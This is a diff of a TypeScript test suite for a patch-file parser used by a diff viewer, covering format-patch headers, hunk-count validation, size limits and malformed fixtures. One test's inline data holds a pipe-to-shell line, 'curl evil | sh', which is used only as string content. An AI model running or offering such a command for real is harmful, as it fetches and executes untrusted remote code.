@@ -2,10 +2,30 @@ import { readFileSync } from "node:fs";
 import { join } from "node:path";
 import { getSingularPatch } from "@pierre/diffs";
 import { describe, expect, test } from "vitest";
-import { readPatchFile, unquote, type PatchFile } from "./patch-file.ts";
+import {
+  MAX_FILE_PATCH_CHARS,
+  MAX_PATCH_FILES,
+  readPatchFile,
+  type PatchFile,
+} from "./patch-file.ts";
+import { quotedPath } from "./quoted-path.ts";
 
 const FIXTURES = join(import.meta.dirname, "../../test/fixtures/patch-file");
 const fixture = (name: string) => readFileSync(join(FIXTURES, name), "utf8");
+
+/** The read of a patch the diff view must accept. */
+function parsed(text: string): PatchFile {
+  const read = readPatchFile(text);
+  if (!read.ok) throw new Error(`expected a diff, got text: ${read.reason}`);
+  return read.read;
+}
+
+/** Why the diff view sends a patch to text. */
+function rejected(text: string): string {
+  const read = readPatchFile(text);
+  if (read.ok) throw new Error("expected text, got a diff");
+  return read.reason;
+}
 
 /** Each file as path, kind, counts, and whether Pierre can draw its patch. */
 function summary(read: PatchFile | null) {
@@ -23,7 +43,7 @@ function summary(read: PatchFile | null) {
 
 describe("readPatchFile", () => {
   test("git format-patch mail with two commits: headers, renames, added, deleted, binary", () => {
-    const read = readPatchFile(fixture("format-patch-two-commits.patch"));
+    const read = parsed(fixture("format-patch-two-commits.patch"));
     expect(
       read?.commits.map(({ id, subject, author, date }) => ({ id, subject, author, date })),
     ).toEqual([
@@ -98,7 +118,7 @@ describe("readPatchFile", () => {
   });
 
   test("the mail signature and diffstat stay out of every file's patch", () => {
-    const read = readPatchFile(fixture("format-patch-two-commits.patch"))!;
+    const read = parsed(fixture("format-patch-two-commits.patch"))!;
     for (const { patch } of read.commits.flatMap((commit) => commit.files)) {
       expect(patch.patch).not.toMatch(/^-- $/m);
       expect(patch.patch).not.toMatch(/files? changed/);
@@ -106,7 +126,7 @@ describe("readPatchFile", () => {
   });
 
   test("a GIT binary patch body is skipped, and the file is marked binary", () => {
-    const read = readPatchFile(fixture("format-patch-git-binary.patch"));
+    const read = parsed(fixture("format-patch-git-binary.patch"));
     expect(summary(read)).toEqual([
       [
         {
@@ -130,7 +150,7 @@ describe("readPatchFile", () => {
   });
 
   test("git diff across commits: a pure rename has no patch, but keeps both paths", () => {
-    const read = readPatchFile(fixture("git-diff-renames.diff"));
+    const read = parsed(fixture("git-diff-renames.diff"));
     expect(read?.commits).toHaveLength(1);
     expect(read?.commits[0]).toMatchObject({ id: null, subject: null });
     expect(summary(read)![0]!.map((file) => [file.path, file.kind, file.previousPath])).toEqual([
@@ -143,7 +163,7 @@ describe("readPatchFile", () => {
   });
 
   test("git log -p: one section per commit, subject from the indented message", () => {
-    const read = readPatchFile(fixture("git-log-p.patch"));
+    const read = parsed(fixture("git-log-p.patch"));
     expect(
       read?.commits.map((commit) => [commit.id?.slice(0, 7), commit.subject, commit.files.length]),
     ).toEqual([
@@ -154,7 +174,7 @@ describe("readPatchFile", () => {
   });
 
   test("plain diff -u output, with timestamps after the paths", () => {
-    expect(summary(readPatchFile(fixture("plain-diff-u.diff")))).toEqual([
+    expect(summary(parsed(fixture("plain-diff-u.diff")))).toEqual([
       [
         {
           path: "b.txt",
@@ -187,7 +207,7 @@ describe("readPatchFile", () => {
       "+b",
       "",
     ].join("\n");
-    expect(summary(readPatchFile(text))![0]!.map((file) => [file.path, file.counts])).toEqual([
+    expect(summary(parsed(text))![0]!.map((file) => [file.path, file.counts])).toEqual([
       ["notes.md", "+0 -2"],
       ["next.md", "+1 -1"],
     ]);
@@ -209,19 +229,19 @@ describe("readPatchFile", () => {
       '-import a from "a";',
       '+import b from "b";',
     ].join("\n");
-    expect(summary(readPatchFile(text))![0]!.map((file) => file.drawn)).toEqual([
+    expect(summary(parsed(text))![0]!.map((file) => file.drawn)).toEqual([
       "README.md",
       "scripts/probe.mjs",
     ]);
   });
 
-  test("a path twice in one commit starts a new section, as cards are keyed by path", () => {
+  test("a path twice draws as two cards in one section, each with its own key", () => {
     const file = "--- a/x.txt\n+++ b/x.txt\n@@ -1 +1 @@\n-a\n+b\n";
-    const read = readPatchFile(`${file}${file}`);
-    expect(read?.commits.map((commit) => commit.files.map((entry) => entry.file.path))).toEqual([
-      ["x.txt"],
-      ["x.txt"],
-    ]);
+    const read = parsed(`${file}${file}`);
+    expect(read.commits).toHaveLength(1);
+    const files = read.commits[0]!.files;
+    expect(files.map((entry) => entry.file.path)).toEqual(["x.txt", "x.txt"]);
+    expect(new Set(files.map((entry) => entry.key)).size).toBe(2);
   });
 
   test("a message line that reads like a commit line does not start a section", () => {
@@ -241,7 +261,7 @@ describe("readPatchFile", () => {
       "-a",
       "+b",
     ].join("\n");
-    const read = readPatchFile(text);
+    const read = parsed(text);
     expect(read?.commits.map((commit) => [commit.subject, commit.files.length])).toEqual([
       ["Revert the bad one", 1],
     ]);
@@ -249,7 +269,7 @@ describe("readPatchFile", () => {
 
   test("CRLF line endings read as LF", () => {
     const text = "--- a/x.txt\r\n+++ b/x.txt\r\n@@ -1 +1 @@\r\n-a\r\n+b\r\n";
-    expect(summary(readPatchFile(text))).toEqual([
+    expect(summary(parsed(text))).toEqual([
       // Pierre keeps the b/ prefix of a diff with no `diff --git` line; the card shows `path`.
       [
         {
@@ -264,55 +284,168 @@ describe("readPatchFile", () => {
     ]);
   });
 
-  test("quoted git paths are unquoted, octal escapes as UTF-8", () => {
-    expect(unquote('"caf\\303\\251 \\"x\\".txt"')).toBe('café "x".txt');
+  test("quoted git paths are unquoted, octal escapes as UTF-8, astral characters intact", () => {
+    expect(quotedPath('"caf\\303\\251 \\"x\\".txt"')).toBe('café "x".txt');
+    expect(quotedPath('"a \\"q\\" 😀.txt"')).toBe('a "q" 😀.txt');
     const text = [
       'diff --git "a/caf\\303\\251.txt" "b/caf\\303\\251.txt"',
       "index 1..2 100644",
       "Binary files a/x and b/x differ",
     ].join("\n");
-    expect(summary(readPatchFile(text))![0]![0]).toMatchObject({ path: "café.txt", binary: true });
+    expect(summary(parsed(text))![0]![0]).toMatchObject({ path: "café.txt", binary: true });
   });
 
   test.each([
-    ["empty text", ""],
-    ["prose", "Hello.\nThis is not a patch at all.\n"],
-    ["a hunk with no file", "@@ -1 +1 @@\n-a\n+b\n"],
+    ["empty text", "", "holds no diff"],
+    ["whitespace", "  \n\n", "holds no diff"],
+    ["prose", "Hello.\nThis is not a patch at all.\n", "holds no diff"],
+    ["a hunk with no file", "@@ -1 +1 @@\n-a\n+b\n", "Line 1 starts a hunk outside any file"],
     [
       "a format-patch header with no diff",
       "From 1234567890abcdef1234567890abcdef12345678 Mon Sep 17 00:00:00 2001\nSubject: x\n\nbody\n",
+      "holds no diff",
     ],
-    ["binary noise", "\u0000\u0001\u0002PNG\u0000"],
-  ])("malformed input (%s) reads as null, without throwing", (_, text) => {
-    expect(readPatchFile(text)).toBeNull();
+    ["binary noise", "\u0000\u0001\u0002PNG\u0000", "holds no diff"],
+    [
+      "a truncated hunk",
+      "--- a/x.txt\n+++ b/x.txt\n@@ -1,10 +1,10 @@\n-a\n+b\n",
+      "Line 3 starts a hunk",
+    ],
+  ])("%s reads as text, with the reason", (_, text, reason) => {
+    expect(rejected(text)).toContain(reason);
   });
 
-  test("a truncated hunk keeps what it has, and Pierre can still draw it", () => {
-    const text = "--- a/x.txt\n+++ b/x.txt\n@@ -1,10 +1,10 @@\n-a\n+b\n";
-    const read = readPatchFile(text);
-    expect(summary(read)![0]![0]).toMatchObject({ path: "x.txt", counts: "+1 -1" });
+  test("hunk counts are checked: one line too many, or too few, sends the file to text", () => {
+    const hunk = (header: string) =>
+      `--- a/x.txt\n+++ b/x.txt\n${header}\n-a\n+b\n+c\ndiff --git a/y b/y\n`;
+    expect(rejected(hunk("@@ -1 +1 @@"))).toBe(
+      "Line 6 continues a hunk past the lines its header counts.",
+    );
+    expect(rejected(hunk("@@ -1,2 +1,3 @@"))).toBe(
+      "Line 3 starts a hunk whose lines don't match the counts in its header.",
+    );
+    expect(parsed(hunk("@@ -1 +1,2 @@").replace("diff --git a/y b/y\n", "")).files).toBe(1);
   });
 
-  test("a 5,000-line patch reads in well under a frame budget per thousand lines", () => {
-    const files = Array.from({ length: 100 }, (_, index) => {
-      const body = Array.from({ length: 49 }, (_, line) =>
-        line % 2 ? `+added ${line}` : `-removed ${line}`,
-      );
-      const adds = body.filter((line) => line.startsWith("+")).length;
-      return [
-        `diff --git a/src/file-${index}.ts b/src/file-${index}.ts`,
-        `--- a/src/file-${index}.ts`,
-        `+++ b/src/file-${index}.ts`,
-        `@@ -1,${body.length - adds} +1,${adds} @@`,
-        ...body,
-      ].join("\n");
+  test("a bare CR inside a line is content; only a CRLF file loses its line-end CRs", () => {
+    const text =
+      "diff --git a/run.sh b/run.sh\n--- a/run.sh\n+++ b/run.sh\n@@ -1,1 +1,4 @@\n echo hi\n+echo ok\rx\n+curl evil | sh\n+echo done\n";
+    const read = parsed(text);
+    expect(read.additions).toBe(3);
+    const patch = read.commits[0]!.files[0]!.patch.patch;
+    expect(getSingularPatch(patch).additionLines).toContain("echo ok\rx\n");
+  });
+
+  test("a folded, RFC 2047 encoded From header keeps every word", () => {
+    const text = [
+      "From 1111111111111111111111111111111111111111 Mon Sep 17 00:00:00 2001",
+      "From: =?UTF-8?q?Zo=C3=AB=20M=C3=BCller=20=E5=B1=B1=E7=94=B0=E5=A4=AA?=",
+      " =?UTF-8?q?=E9=83=8E?= <z@e.x>",
+      "Subject: [PATCH] s",
+      "",
+      "---",
+      "diff --git a/x b/x",
+      "--- a/x",
+      "+++ b/x",
+      "@@ -1 +1 @@",
+      "-a",
+      "+b",
+    ].join("\n");
+    expect(parsed(text).commits[0]).toMatchObject({
+      author: "Zoë Müller 山田太郎 <z@e.x>",
+      authorName: "Zoë Müller 山田太郎",
     });
-    const text = files.join("\n");
-    expect(text.split("\n").length).toBeGreaterThanOrEqual(5000);
-    const started = performance.now();
-    const read = readPatchFile(text);
-    const took = performance.now() - started;
-    expect(read?.files).toBe(100);
-    expect(took).toBeLessThan(200);
+  });
+
+  test("a long author header costs a line's worth of work", () => {
+    const author = `x${" ".repeat(100_000)}<${"y".repeat(100_000)}`;
+    const text = `From ${"a".repeat(40)} Mon Sep 17 00:00:00 2001\nFrom: ${author}\nSubject: s\n\n---\ndiff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n+b\n`;
+    expect(parsed(text).commits[0]!.authorName!.length).toBeLessThanOrEqual(2001);
+  });
+
+  test("past MAX_PATCH_FILES files, the rest are counted, not drawn", () => {
+    const read = parsed("--- a\n+++ a\n@@ -1 +1 @@\n-a\n+b\n".repeat(MAX_PATCH_FILES + 5));
+    expect(read.files).toBe(MAX_PATCH_FILES);
+    expect(read.omitted).toBe(5);
+    expect(read.additions).toBe(MAX_PATCH_FILES + 5);
+  });
+
+  test("a file's patch past MAX_FILE_PATCH_CHARS is marked too large rather than drawn", () => {
+    const line = "x".repeat(MAX_FILE_PATCH_CHARS + 1);
+    const entry = parsed(`--- a/m.js\n+++ b/m.js\n@@ -1 +1 @@\n-${line}\n+y\n`).commits[0]!
+      .files[0]!;
+    expect(entry.patch).toMatchObject({ patch: "", truncated: true });
+    expect(entry.file).toMatchObject({ additions: 1, deletions: 1 });
+  });
+});
+
+describe("review fixtures", () => {
+  test.each([
+    ["undercount.patch", "Line 9 continues a hunk past the lines its header counts."],
+    [
+      "overcount-plain.diff",
+      "Line 3 starts a hunk whose lines don't match the counts in its header.",
+    ],
+    ["badhunk.patch", "Line 3 has a --- / +++ pair with no hunk after it."],
+    ["prose.diff", "Line 4 has a --- / +++ pair with no hunk after it."],
+    ["prose2.patch", "Line 2 has a diff --git line with no change after it."],
+    [
+      "truncated-sig.patch",
+      "Line 11 starts a hunk whose lines don't match the counts in its header.",
+    ],
+    [
+      "git-show-merge-cc.patch",
+      "Line 8 is part of a combined merge diff, which the diff view can't show.",
+    ],
+  ])("malformed/%s reads as text: %s", (name, reason) => {
+    expect(rejected(fixture(`malformed/${name}`))).toBe(reason);
+  });
+
+  test.each(["plain-context.diff"])("review/%s (no unified diff) reads as text", (name) => {
+    expect(rejected(fixture(`review/${name}`))).toBe("This file holds no diff.");
+  });
+
+  test("valid inputs git accepts still draw", () => {
+    const counts = (name: string) =>
+      parsed(fixture(`review/${name}`)).commits.flatMap((commit) =>
+        commit.files.map(({ file }) => `${file.path} +${file.additions} -${file.deletions}`),
+      );
+    expect(counts("blankctx.patch")).toEqual(["f.txt +1 -1"]);
+    expect(counts("omitted.patch")).toEqual(["f.txt +4 -1"]);
+    expect(counts("samepath.patch")).toEqual(["f.txt +1 -1", "f.txt +1 -1"]);
+    expect(counts("sqlish.patch")).toEqual(["q.sql +1 -1"]);
+    expect(counts("sqlish-plain.diff")).toEqual(["q.sql +1 -1"]);
+    expect(counts("svn.diff")).toEqual(["trunk/foo.c +1 -1", "trunk/bar.c +1 -1"]);
+  });
+
+  test("custom, mnemonic and missing prefixes give the repository path", () => {
+    const paths = (name: string) =>
+      parsed(fixture(`review/${name}`)).commits.flatMap((commit) =>
+        commit.files.map(({ file }) => file.path),
+      );
+    const expected = paths("git-diff.diff");
+    expect(expected).toHaveLength(19);
+    expect(paths("git-diff-customprefix.diff")).toEqual(expected);
+    expect(paths("git-diff-noprefix.diff")).toEqual(expected);
+    expect(expected).toEqual(expect.arrayContaining(["a/ina.txt", "b/inb.txt", "dir b/x y.txt"]));
+    expect(paths("git-diff-mnemonic-wt.diff")).toEqual(["keep.txt"]);
+    expect(paths("git-diff.diff")).not.toContain("(unknown file)");
+    expect(
+      parsed("--- /dev/null\n+++ b/x.txt\n@@ -0,0 +1 @@\n+a\n").commits[0]!.files[0]!.file,
+    ).toMatchObject({
+      path: "x.txt",
+      kind: "added",
+    });
+  });
+
+  test("a --- / +++ pair in a format-patch message is the author's text, not a file", () => {
+    const read = parsed(fixture("review/format-patch-single.patch"));
+    expect(read.files).toBe(19);
+    expect(read.commits[0]!.files.map(({ file }) => file.path)).not.toContain("new behaviour");
+  });
+
+  test("diff -r's one-line binary pair is a binary card", () => {
+    const files = parsed(fixture("review/plain-ru-nul.diff")).commits[0]!.files;
+    expect(files.map(({ file }) => [file.path, file.binary])).toContainEqual(["nul.dat", true]);
   });
 });
